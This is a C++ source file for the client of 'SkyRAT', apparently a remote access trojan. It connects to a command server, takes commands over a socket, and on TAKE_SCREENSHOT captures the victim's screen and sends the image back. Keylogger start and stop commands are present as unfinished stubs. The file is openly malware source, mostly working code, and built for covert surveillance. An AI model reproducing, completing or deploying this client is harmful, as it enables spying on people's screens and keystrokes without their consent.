// compile alternatives:
// g++ -std=c++11 client.cpp -o client -pthread
// g++ -std=c++11 client.cpp -o client -lws2_32

#include <iostream>
#include <thread>
#include <cstring>
#include <string>
#include <atomic>
#include <csignal>
#include <fstream>
#include <vector>
#include <sstream>

// module headers
#include <memory>
#include "modules/ss_module.h"

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Gdiplus.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#define INVALID_SOCKET -1
#define SOCKET_ERROR   -1
typedef int SOCKET;
#endif

// Configuration of server connection
const char* SERVER_IP     = "127.0.0.1"; // Server IP address
const uint16_t SERVER_PORT = 4545;        // Server port
const int    RECV_BUF_SIZE = 1024;        // Buffer size for receiving data

// Global atomic flag for graceful shutdown
std::atomic<bool> g_running{true};

// Simple msgpack-like message structure for server compatibility
std::vector<char> create_message(const std::string& content) {
    // Create a minimal msgpack array with one map element
    // This is a very basic msgpack format: [{"content": "message"}]
    
    std::vector<char> result;
    
    // Array with 1 element (fixarray format: 0x91)
    result.push_back(0x91);
    
    // Map with 1 key-value pair (fixmap format: 0x81)
    result.push_back(0x81);
    
    // Key: "content" (fixstr with length 7: 0xa7)
    result.push_back(0xa7);
    result.insert(result.end(), {'c','o','n','t','e','n','t'});
    
    // Value: content string
    if (content.length() < 32) {
        // fixstr format: 0xa0 + length
        result.push_back(0xa0 + static_cast<char>(content.length()));
    } else {
        // For longer strings, use str8 format
        result.push_back(0xd9);
        result.push_back(static_cast<char>(content.length()));
    }
    result.insert(result.end(), content.begin(), content.end());
    
    return result;
}

// Signal handler to catch termination signals (like Ctrl+C)
void signal_handler(int signal) {
    std::cout << "\n[Signal] Received signal " << signal << ". Shutting down gracefully..." << std::endl;
    g_running = false; // Set the flag to false to stop main loop
}

// Function to send a file over socket
bool SendFile(SOCKET sock, const char* filename) {
    // Open file in binary mode
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return false;
    }

    // Get file size
    file.seekg(0, std::ios::end);
    size_t filesize = file.tellg();
    file.seekg(0, std::ios::beg);

    // Send the size of the file first
    send(sock, (char*)&filesize, sizeof(filesize), 0);

    // Send file contents in chunks
    char buffer[1024];
    while (!file.eof()) {
        file.read(buffer, sizeof(buffer));
        std::streamsize bytesRead = file.gcount();
        send(sock, buffer, bytesRead, 0);
    }

    // Close the file
    file.close();
    return true;
}

// Initialize socket subsystem
bool init_sockets() {
#ifdef _WIN32
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2,2), &wsaData) == 0;
#else
    return true;
#endif
}

// Cleanup socket subsystem
void cleanup_sockets() {
#ifdef _WIN32
    WSACleanup();
#endif
}

// Create and connect socket to server
SOCKET connect_to_server(const char* ip, uint16_t port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Error: Could not create socket." << std::endl;
        return INVALID_SOCKET;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip);

    // Connect to server
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Error: Connection failed." << std::endl;
#ifdef _WIN32
        closesocket(sock);
#else
        close(sock);
#endif
        return INVALID_SOCKET;
    }

    return sock; // Return connected socket
}

// Send message over socket using server's expected format
bool send_message(SOCKET sock, const std::string& msg) {
    std::vector<char> formatted_msg = create_message(msg);
    return send(sock, formatted_msg.data(), static_cast<int>(formatted_msg.size()), 0) != SOCKET_ERROR;
}

// Receive message from socket
int receive_reply(SOCKET sock, char* buffer, int bufSize) {
    int bytes = recv(sock, buffer, bufSize - 1, 0);
    if (bytes > 0) buffer[bytes] = '\0'; // Null-terminate the received data
    return bytes;
}

// Handle commands received from server
void handle_command(const std::string& command, SOCKET sock) {
    std::cout << "[Command] Received: " << command << std::endl;

    if (command == "TAKE_SCREENSHOT") {
        std::cout << "[Action] Taking screenshot..." << std::endl;

        try {
            // Initialize GDI+
            ULONG_PTR gdiplusToken;
            Gdiplus::GdiplusStartupInput gdiStartupInput;
            Gdiplus::Status status = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiStartupInput, NULL);
            
            if (status != Gdiplus::Ok) {
                std::cerr << "[Error] Failed to initialize GDI+. Status: " << status << std::endl;
                return;
            }

            const char* filename = "screenshot.png"; // Save filename
            TakeScreenshot(filename); // Capture screenshot
            
            std::cout << "[Action] Screenshot taken, sending file..." << std::endl;
            if (!SendFile(sock, filename)) {
                std::cerr << "[Error] Failed to send screenshot file" << std::endl;
            } else {
                std::cout << "[Action] Screenshot sent successfully" << std::endl;
            }

            Gdiplus::GdiplusShutdown(gdiplusToken); // Shutdown GDI+
        } catch (const std::exception& e) {
            std::cerr << "[Error] Exception in screenshot handling: " << e.what() << std::endl;
        }
    }
    else if (command == "START_KEYLOGGER") {
        std::cout << "[Action] Starting keylogger module..." << std::endl;
        // TODO: Implement keylogger start
    }
    else if (command == "STOP_KEYLOGGER") {
        std::cout << "[Action] Stopping keylogger..." << std::endl;
        // TODO: Implement keylogger stop
    }
    else {
        std::cout << "[Action] Unknown command, echoing back: " << command << std::endl;
    }
}

// Connection handler in a separate thread
void handle_connection() {
    if (!init_sockets()) {
        std::cerr << "Error: Socket subsystem init failed." << std::endl;
        return;
    }

    SOCKET sock = connect_to_server(SERVER_IP, SERVER_PORT);
    if (sock == INVALID_SOCKET) {
        cleanup_sockets();
        return;
    }
    std::cout << "[Thread] Connected to server on " << SERVER_IP << ":" << SERVER_PORT << std::endl;

    // Send initial greeting message
    std::string greeting = "Hello from threaded client!";
    if (!send_message(sock, greeting)) {
        std::cerr << "Error: Send failed." << std::endl;
        goto cleanup;
    }
    std::cout << "[Thread] Sent greeting to server" << std::endl;

    // Listening for server commands
    char buffer[RECV_BUF_SIZE];
    std::cout << "[Thread] Starting command listening loop..." << std::endl;
    
    while (g_running) {
        std::cout << "[Thread] Waiting for command..." << std::endl;
        int received = receive_reply(sock, buffer, RECV_BUF_SIZE);
        
        if (received > 0) {
            std::cout << "[Thread] Received " << received << " bytes" << std::endl;
            std::string command(buffer);
            handle_command(command, sock);

            // Send acknowledgment back
            std::string ack = "ACK: " + command;
            if (!send_message(sock, ack)) {
                std::cerr << "Error: Failed to send acknowledgment." << std::endl;
                break;
            }
            std::cout << "[Thread] Sent acknowledgment" << std::endl;
        } else if (received == 0) {
            std::cout << "[Thread] Server closed the connection." << std::endl;
            break;
        } else {
            std::cerr << "Error: Receive failed. Error code: " << received << std::endl;
#ifdef _WIN32
            std::cerr << "WSA Error: " << WSAGetLastError() << std::endl;
#endif
            break;
        }
    }

cleanup:
#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
    cleanup_sockets();
    std::cout << "[Thread] Connection closed." << std::endl;
}

int main() {
    std::cout << "Starting SkyRAT threaded client..." << std::endl;

    // Register signal handler
    std::signal(SIGINT, signal_handler);

    // Launch thread for handling connection
    std::thread clientThread(handle_connection);

    // Wait for thread to finish (blocks until connection thread exits)
    clientThread.join();

    std::cout << "Client thread finished. Exiting." << std::endl;
    return 0;
}
